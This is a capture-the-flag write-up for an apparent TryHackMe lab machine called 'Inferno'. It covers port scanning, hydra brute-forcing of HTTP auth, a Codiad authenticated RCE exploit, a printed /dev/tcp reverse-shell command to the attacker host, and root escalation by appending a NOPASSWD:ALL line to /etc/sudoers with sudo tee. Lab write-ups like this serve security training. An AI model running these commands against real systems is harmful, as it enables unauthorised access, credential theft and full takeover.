# Enumeration

## Ports (Rustscan)
- There are many ports open

```console
❯ rustscan -a 10.10.129.126 --ulimit 5000 -- -sC -sV -vvv | tee rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.129.126:21
Open 10.10.129.126:25
Open 10.10.129.126:22
Open 10.10.129.126:23
Open 10.10.129.126:110
Open 10.10.129.126:80
Open 10.10.129.126:106
Open 10.10.129.126:194
Open 10.10.129.126:750
Open 10.10.129.126:779
Open 10.10.129.126:808
Open 10.10.129.126:777
Open 10.10.129.126:775
Open 10.10.129.126:1210
Open 10.10.129.126:1236
Open 10.10.129.126:1178
Open 10.10.129.126:1529
Open 10.10.129.126:2003
Open 10.10.129.126:2603
Open 10.10.129.126:2608
Open 10.10.129.126:2600
Open 10.10.129.126:2606
Open 10.10.129.126:2605
Open 10.10.129.126:2989
Open 10.10.129.126:4224
Open 10.10.129.126:5151
Open 10.10.129.126:5052
Open 10.10.129.126:4949
Open 10.10.129.126:5354
Open 10.10.129.126:5432
Open 10.10.129.126:5355
Open 10.10.129.126:5674
Open 10.10.129.126:5680
Open 10.10.129.126:5667
Open 10.10.129.126:8021
Open 10.10.129.126:8081
Open 10.10.129.126:8088
Open 10.10.129.126:8990
Open 10.10.129.126:443
Open 10.10.129.126:389
Open 10.10.129.126:9418
Open 10.10.129.126:1313
Open 10.10.129.126:1300
Open 10.10.129.126:1314
Open 10.10.129.126:9673
Open 10.10.129.126:2150
Open 10.10.129.126:2121
Open 10.10.129.126:1001
Open 10.10.129.126:10081
Open 10.10.129.126:10082
Open 10.10.129.126:5675
Open 10.10.129.126:5666
Open 10.10.129.126:6514
Open 10.10.129.126:11201
Open 10.10.129.126:15345
Open 10.10.129.126:9098
Open 10.10.129.126:9359
Open 10.10.129.126:17002
Open 10.10.129.126:17001
Open 10.10.129.126:17003
Open 10.10.129.126:17004
Open 10.10.129.126:10083
Open 10.10.129.126:20012
Open 10.10.129.126:24554
Open 10.10.129.126:20011
Open 10.10.129.126:57000
Open 10.10.129.126:60179
Open 10.10.129.126:60177
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-23 14:50 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:50
Completed NSE at 14:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:50
Completed NSE at 14:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:50
Completed NSE at 14:50, 0.00s elapsed
Initiating Ping Scan at 14:50
Scanning 10.10.129.126 [2 ports]
Completed Ping Scan at 14:50, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:50
Completed Parallel DNS resolution of 1 host. at 14:50, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:50
Scanning 10.10.129.126 [68 ports]
Discovered open port 60179/tcp on 10.10.129.126
Discovered open port 80/tcp on 10.10.129.126
Discovered open port 22/tcp on 10.10.129.126
Discovered open port 2603/tcp on 10.10.129.126
Discovered open port 15345/tcp on 10.10.129.126
Discovered open port 8088/tcp on 10.10.129.126
Discovered open port 1001/tcp on 10.10.129.126
Discovered open port 57000/tcp on 10.10.129.126
Discovered open port 20012/tcp on 10.10.129.126
Discovered open port 20011/tcp on 10.10.129.126
Discovered open port 17004/tcp on 10.10.129.126
Discovered open port 5680/tcp on 10.10.129.126
Discovered open port 8990/tcp on 10.10.129.126
Discovered open port 10081/tcp on 10.10.129.126
Discovered open port 5355/tcp on 10.10.129.126
Discovered open port 808/tcp on 10.10.129.126
Discovered open port 5354/tcp on 10.10.129.126
Discovered open port 106/tcp on 10.10.129.126
Discovered open port 5052/tcp on 10.10.129.126
Discovered open port 9359/tcp on 10.10.129.126
Discovered open port 2150/tcp on 10.10.129.126
Discovered open port 11201/tcp on 10.10.129.126
Discovered open port 2989/tcp on 10.10.129.126
Discovered open port 60177/tcp on 10.10.129.126
Completed Connect Scan at 14:50, 1.50s elapsed (68 total ports)
Initiating Service scan at 14:50
Scanning 24 services on 10.10.129.126
Completed Service scan at 14:51, 27.64s elapsed (24 services on 1 host)
NSE: Script scanning 10.10.129.126.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 17.73s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.84s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
Nmap scan report for 10.10.129.126
Host is up, received syn-ack (0.15s latency).
Scanned at 2022-11-23 14:50:52 IST for 47s

PORT      STATE  SERVICE         REASON       VERSION
21/tcp    closed ftp             conn-refused
22/tcp    open   ssh             syn-ack      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
23/tcp    closed telnet          conn-refused
25/tcp    closed smtp            conn-refused
80/tcp    open   http            syn-ack      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Dante's Inferno
106/tcp   open   tcpwrapped      syn-ack
110/tcp   closed pop3            conn-refused
194/tcp   closed irc             conn-refused
389/tcp   closed ldap            conn-refused
443/tcp   closed https           conn-refused
750/tcp   closed kerberos        conn-refused
775/tcp   closed entomb          conn-refused
777/tcp   closed multiling-http  conn-refused
779/tcp   closed unknown         conn-refused
808/tcp   open   tcpwrapped      syn-ack
1001/tcp  open   tcpwrapped      syn-ack
1178/tcp  closed skkserv         conn-refused
1210/tcp  closed eoss            conn-refused
1236/tcp  closed bvcontrol       conn-refused
1300/tcp  closed h323hostcallsc  conn-refused
1313/tcp  closed bmc_patroldb    conn-refused
1314/tcp  closed pdps            conn-refused
1529/tcp  closed support         conn-refused
2003/tcp  closed finger          conn-refused
2121/tcp  closed ccproxy-ftp     conn-refused
2150/tcp  open   dynamic3d?      syn-ack
2600/tcp  closed zebrasrv        conn-refused
2603/tcp  open   tcpwrapped      syn-ack
2605/tcp  closed bgpd            conn-refused
2606/tcp  closed netmon          conn-refused
2608/tcp  closed wag-service     conn-refused
2989/tcp  open   zarkov?         syn-ack
4224/tcp  closed xtell           conn-refused
4949/tcp  closed munin           conn-refused
5052/tcp  open   tcpwrapped      syn-ack
5151/tcp  closed esri_sde        conn-refused
5354/tcp  open   mdnsresponder?  syn-ack
5355/tcp  open   llmnr?          syn-ack
5432/tcp  closed postgresql      conn-refused
5666/tcp  closed nrpe            conn-refused
5667/tcp  closed unknown         conn-refused
5674/tcp  closed hyperscsi-port  conn-refused
5675/tcp  closed v5ua            conn-refused
5680/tcp  open   tcpwrapped      syn-ack
6514/tcp  closed syslog-tls      conn-refused
8021/tcp  closed ftp-proxy       conn-refused
8081/tcp  closed blackice-icecap conn-refused
8088/tcp  open   radan-http?     syn-ack
8990/tcp  open   tcpwrapped      syn-ack
9098/tcp  closed unknown         conn-refused
9359/tcp  open   tcpwrapped      syn-ack
9418/tcp  closed git             conn-refused
9673/tcp  closed unknown         conn-refused
10081/tcp open   famdc?          syn-ack
10082/tcp closed amandaidx       conn-refused
10083/tcp closed amidxtape       conn-refused
11201/tcp open   smsqp?          syn-ack
15345/tcp open   xpilot?         syn-ack
17001/tcp closed unknown         conn-refused
17002/tcp closed unknown         conn-refused
17003/tcp closed unknown         conn-refused
17004/tcp open   tcpwrapped      syn-ack
20011/tcp open   unknown         syn-ack
20012/tcp open   ss-idi-disc?    syn-ack
24554/tcp closed binkp           conn-refused
57000/tcp open   tcpwrapped      syn-ack
60177/tcp open   tcpwrapped      syn-ack
60179/tcp open   tcpwrapped      syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.52 seconds
```

- Lets start with 80

# Web (Manual)

- Web page shows some latin text and an image.

```console
❯ curl inferno.thm
<!DOCTYPE html>
<html>
<head>
 <title>Dante's Inferno</title>
<style>
.center {
  text-align: center;
  border: 3px solid white;
}
</style>
</head>
<body style="background-color:black;">

<h2></h2>

<div class="center">
  <p style="color:white">
Oh quanto parve a me gran maraviglia</br>
quand'io vidi tre facce a la sua testa!</br>
L'una dinanzi, e quella era vermiglia;</br>
</br>
l'altr'eran due, che s'aggiugnieno a questa</br>
sovresso 'l mezzo di ciascuna spalla, </br>
e se' giugnieno al loco de la cresta </br>
</p>
</div>
</br>

<div class="center">
<img src="1.jpg" alt="" width="800" height="600">


</div>

</body>
</html>
```

## Web (Gobuster)
- Started gobuster on the machine and found a directory `/inferno`

```console
❯ gobuster dir --url http://10.10.129.126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.129.126
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/23 15:09:28 Starting gobuster in directory enumeration mode
===============================================================
/inferno              (Status: 401) [Size: 460]
Progress: 34975 / 220561 (15.86%)
```

- Checked it out but it asks for password

![screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/12.png)

- Tried hydra with `http-get` and username as found

## Web (hyrda brute-forcing)

```console
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt -f inferno.thm http-get /inferno/ -o hydra.log -t 64
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-23 15:22:00
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://inferno.thm:80/inferno/
[STATUS] 8692.00 tries/min, 8692 tries in 00:01h, 14335707 to do in 27:30h, 64 active
[80][http-get] host: inferno.thm   login: admin   password: dante1
[STATUS] attack finished for inferno.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-23 15:23:36
```

- Got the credentials.
- Logged in and found another login page, again logged in with same credentials

## Codiad
- We are presented with a code editor, this seems to be, a CMS
- Title says codiad, so searched for exploit and found one

```console
❯ searchsploit codiad
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                                                                              | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                                                                  | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                                                 | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                                             | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                                             | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                                             | multiple/webapps/50474.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
- Downloaded the exploit and executed it.

```console
❯ python3 49705.py http://admin:dante1@10.10.129.126/inferno/ admin dante1 10.17.0.215 1234 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.17.0.215/1235 0>&1 2>&1"' | nc -lnvp 1234
nc -lnvp 1235
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
{"status":"error","message":"No Results Returned"}
[+] Exploit finished!
[+] Enjoy your reverse shell!
```

- Got a reverse shell.

```console
nc -lnvp 1235
listening on [any] 1235 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.129.126] 35120
bash: cannot set terminal process group (900): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Inferno:/var/www/html/inferno/components/filemanager$
```

- Found a backup file in `/home/Downloads` named `.download.dat`.

```console
<ilemanager$ cat /home/dante/Downloads/.download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

- Decoded this from cyberchef 

```text
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3
```

- Secure shelled as dante

```console
❯ ssh dante@inferno.thm
The authenticity of host 'inferno.thm (10.10.129.126)' can't be established.
ED25519 key fingerprint is SHA256:YUnYuJpwLi/VNgOqUh7eCD9Pcw8Lxz/RYQv3sUWPu8E.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'inferno.thm' (ED25519) to the list of known hosts.
dante@inferno.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Nov 23 11:18:04 UTC 2022

  System load:  0.08              Processes:           590
  Usage of /:   42.0% of 8.79GB   Users logged in:     0
  Memory usage: 62%               IP address for eth0: 10.10.129.126
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@Inferno:~$
```

- Found `local.txt`

```console
dante@Inferno:~$ cat local.txt
77f6f3c544ec0811e2d1243e2e0d1835
```

# Root flag

- We can run `tee` as root on the system.

```console
dante@Inferno:~$ sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```
- Found an exploit from `gtfobins`
- Added dante to run all commands as root without password.

```console
dante@Inferno:~$ echo 'dante ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers
dante ALL=(ALL) NOPASSWD:ALL
```

- Started bash as root.

```console
dante@Inferno:~$ sudo bash
root@Inferno:~#
```

- Found root flag

```console
root@Inferno:~# ls /root
proof.txt
root@Inferno:~# cat /root/proof.txt
Congrats!

You've rooted Inferno!

f332678ed0d0767d7434b8516a7c6144

mindsflee
root@Inferno:~#
```



